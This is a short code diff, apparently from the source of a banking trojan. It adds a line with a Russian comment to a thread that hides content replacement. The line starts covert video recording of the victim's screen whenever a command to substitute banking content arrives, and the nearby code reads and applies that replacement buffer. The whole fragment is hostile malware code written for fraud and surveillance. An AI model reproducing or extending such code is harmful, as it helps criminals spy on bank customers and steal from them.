@@ -666,6 +666,7 @@ static DWORD WINAPI ThreadHideReplacement(void*)
 		//char* rpl = (char*)File::ReadToBufferA( "c:\\11.txt", size );
 		if( rpl )
 		{
+			VideoProcess::RecordPID( 0, "CBank" ); //видео пишем только когда была команда на подмену
 			rpl[size - 1] = 0;
 			ReadReplacement(rpl);
 			MemFree(rpl);
